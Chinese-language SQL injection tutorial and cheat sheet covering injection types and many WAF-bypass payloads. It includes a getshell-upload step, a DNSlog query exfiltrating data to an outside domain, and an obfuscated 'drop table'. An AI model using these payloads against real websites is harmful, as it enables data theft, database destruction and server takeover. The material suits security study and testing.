# SQL注入

SQL注入漏洞通常发生在Web应用程序未能正确验证或转义用户输入的情况下。攻击者可以通过注入恶意的SQL语句，从而实现对数据库的非法访问或控制。

## 思路

1.找注入点，判断是否可以注入

> 一般情况使用' " 来判断是否存在注入，如果有报错或者页面产生变化，则可能为注入点

2.判断是数字型注入还是字符型注入

> 比如：and 1=1 、 and 1=2 如果对页面有不同的影响，则为数字型，反之则为字符型

3.如果是字符型注入，判断闭合符

> 闭合符举例：'、"、')、")、...
>
> 目的：使SQL语句闭合，不会报错

4.判断列数

> 举例：mysql中是通过order by 来判断

5.判断显错位

> 举例：mysql中通过union select 1,2,3,... 来判断

6.求库、求表、求字段、求数据

7.找后台路径

8.上传getshell木马，然后连接

## 注入类型

优先使用联合查询注入->报错注入->布尔注入->时间盲注

### 联合查询注入

通过union将多个select语句的结果组合起来，要求每个select语句的列数量和列的类型相同

> 常用函数：
>
> group_concat() 连接字符
>
> concat_ws() 分隔符连接

#### 应用场景

注入点有回显

> UNION使用只有最后一个SELECT子句允许有ORDER BY；只有最后一个SELECT子句允许有LIMIT

### 报错注入

#### 应用场景

* 查询不回显，但会打印错误信息
* update、insert等语句，会打印错误信息

#### 报错注入使用的方法

* floor()
* extractvalue()
* updatexml()

### 布尔盲注

代码存在sql漏洞，但不回显数据，也不回显错误信息，只返回正确或失败，通过构造语句，返回的真和假来判断数据库信息的正确性

#### 常用函数

* left()
> left(a,b)从左侧截取a的前b位；举例：left(database(),1)>'s'  database()显示数据库的名称
* regexp()
> 正则表达式匹配;举例：select user() regexp() '^r'
* like()
> 举例：select user() like 'ro%'
* substr()、ascii()
> 举例：ascii(substr((select database()),1,1))=98
* ord()、mid()
> 举例：ord(mid(select user(),1,1))=114

### 时间盲注

存在sql漏洞，但页面不显示数据，不回显错误信息，也不提示真假。可以通过构造数据，通过页面的响应时间来判断信息。

时间盲注的关键点在于if()函数

> 举例：if(left(user(),1)='a',0,sleep(3));

### DNSlog盲注

很多场景下，无法看到攻击的回显，但是攻击行为确实生效了，通过服务器以外的其它方式提取数据，包括不限于 HTTP(S) 请求、DNS请求、文件系统、电子邮件等。

windows下的路径有一种命名惯例，名为UNC，本来的作用为共享文件与设备，

UNC路径格式为`\\host-name\share-name\object-name`,”hos-name”部分可以是FQDN,这个特性使得win下load_file的UNC可触发DNS请求，

当然也限制了DNSlog盲注只限于 win 下。

> 举例：select load_file(concat('\\\\',(select database()),'.DNS域名'))
>
>这里有四个“\”,因为转义的原因

### 堆叠注入

关于堆叠注入，要从堆叠查询说起，我们知道每一条SQL语句以“；”结束，能多条语句一起执行

第二条语句不必像联合查询那样要求类型一致，甚至能使用 “update”语句修改数据表。

### 宽字节注入

> ASCII编码是占一个字节

> 宽字节：GBK、BIG5等适用于汉字的编码，原来的一个字节无法容纳，需要占更多的字节来编码

#### 产生原因

开发者为防止注入，会对传入的字符进行转义，我们都知道"\\"是转义符，

当攻击者输入`'`时,经过转义变成%5c%27,但我们在前面添加%df,他会与转义符结合形成一个符号，从而让转义符失去作用

### 二次注入

原理：

添加进数据库的恶意数据被二次调用

> 举例：一个网站存在admin账户
>
> 注册一个账户为admin' #
>
> 使用账号admin' # 登录时将会登录admin账户

## WAF绕过

### 注释符绕过

#### 脏数据绕过

`/*aaaa*/` 、`/*\x00\x00*/`

往里面填大量的脏数据来绕过

#### 参数绕过

举例

    /?a=1+union/*&b=*/select+1,pass/*&c=*/from+users--+
    
### 大小写绕过

常用于WAF的正则对大小写不敏感的情况

举例

    uniOn selEct 1,2
    
### 内联注释绕过

内联注释就是把一些特有的仅在MYSQL上的语句放在 `/*!*/`中，这样这些语句如果在其它数据库中是不会被执行，但在MYSQL中会执行。

举例

    union /*!select*/ 1,2
    
### 双写关键字绕过

一些简单的WAF,只是将关键字置空，这时可以使用双写关键字绕过

举例

    union seselectlect 1,2
    
### 特殊编码绕过

#### 十六进制绕过

举例

    UNION SELECT 1,group_concat(column_name) from information_schema.columns where table_name=0x61645F6C696E6B
    
#### ASCII编码绕过

举例

    Test =CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)
    
#### Unicode编码绕过

Unicode有所谓的标准编码和非标准编码，假设我们用的utf-8为标准编码，那么西欧语系所使用的就是非标准编码了

举例

    单引号: %u0027、%u02b9、%u02bc、%u02c8、%u2032、%uff07、%c0%27、%c0%a7、%e0%80%a7
    空格：%u0020、%uff00、%c0%20、%c0%a0、%e0%80%a0
    左括号：%u0028、%uff08、%c0%28、%c0%a8、%e0%80%a8
    右括号：%u0029、%uff09、%c0%29、%c0%a9、%e0%80%a9
    
> %u 用于在url中表示Unicode字符
>
> \u 用于在字符串中表示Unicode字符

#### URL编码绕过

对被拦截的关键字做一次或两次URL全编码

举例

    and 进行两次全编码为%25%36%31%25%36%65%25%36%34
    
进行双重URL编码

举例

    and 进行双重编码为%2561%256e%2564
    
### 关键字替换绕过

#### 空格

可替换的方式

* /**/
* ()
* 回车，即url编码的%0a
* `  tab键上的按钮
* 两个空格

举例

    union/**/select/**/1,2
    select(passwd)from(users)  #注意括号中不能含有*
    select`passwd`from`users`
    
#### or and xor(异或) not

    and => &&
    or => ||
    xor => |
    not => !
    
#### =

不加通配符的like执行的效果和=一致，所以可以用来绕过

举例

    UNION SELECT 1,group_concat(column_name) from information_schema.columns where table_name like "users"
    
rlike:模糊匹配，只要字段的值中存在要查找的 部分 就会被选择出来，用来取代=时，rlike的用法和上面的like一样，没有通配符效果和=一样

举例

    UNION SELECT 1,group_concat(column_name) from information_schema.columns where table_name rlike "users"
    
regexp:MySQL中使用 REGEXP 操作符来进行正则表达式匹配

举例

    UNION SELECT 1,group_concat(column_name) from information_schema.columns where table_name regexp "users"
    
使用大小于号来绕过

举例

    select * from users where id > 1 and id < 3
    
<> 等价于 !=，所以在前面再加一个!结果就是等号了

举例

    select * from users where !(id <> 1)

#### 大小于号

在sql盲注中，通常使用大小于号来判断ascii码值的大小来达到爆破效果

#### 引号

使用十六进制

举例

    UNION SELECT 1,group_concat(column_name) from information_schema.columns where table_name=0x61645F6C696E6B
    
#### 逗号

（1）只能盲注，但逗号被过滤的情况，可以使用from pos for len，其中pos代表从第pos个开始读取len长度的字串

常规写法：
    
    select substr("string",1,3)
    
过滤了逗号，可这样写

    select substr("string" from 1 for 3)
    
sql盲注逗号被过滤后举例

    select ascii(substr(database() from 1 for 1)) > 110
    
（2）使用join关键字

    select * from users union select * from (select 1)a join (select 2)b join(select 3)c
    
等价于
    
    union select 1,2,3
    
（3）使用like

    select user() like "t%"
    
等价于

    select ascii(substr(user(),1,1))=114
    
（4）使用offset

    select * from users limit 1 offset 2

等价于

    select * from users limit 2,1
    
#### 函数

    sleep() => benchmark()
    ascii() => hex()、bin() 替代之后再使用对应的进制转为string即可
    group_concat => concat_ws()
    substr()、substring()、mid()可以互相取代，取子函数的还有left()、right()
    user() => @@user
    database() => @@database
    ord() => ascii() 这两个函数处理英文是一样的，但处理中文可能会不一致
    
### 缓冲区溢出

对于C语言写的WAF，由于C语言没有缓冲区保护机制，当WAF在处理测试向量时超出了其缓冲长度，就会引发bug从而实现绕过

举例

    ?id=1 and (select 1)=(Select 0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26
    
示例0xA*1000指0xA后面”A”重复1000次，一般来说对应用软件构成缓冲区溢出都需要较大的测试长度，这里1000只做参考，在某些情况下可能不需要这么长也能溢出

### HTTP参数控制

通过提供多个参数=相同名称的值集来混淆WAF。

例如使用 Apache/PHP，应用程序将仅解析最后（第二个） id= 而WAF只解析第一 个。

例如使用ASP/IIS，应用程序会将多个参数拼接起来。

ASP/IIS举例

    /?id=1;select+1&id=2,3+from+users+where+id=1--
    
### 特殊符号

不同的Web服务器处理处理构造得特殊请求时有不同的逻辑：

以魔术字符%为例，在Asp/Asp.net中

dr%op ta%ble xxx 其解析为 drop table xxx 但WAF眼中是dr%op ta%ble xxx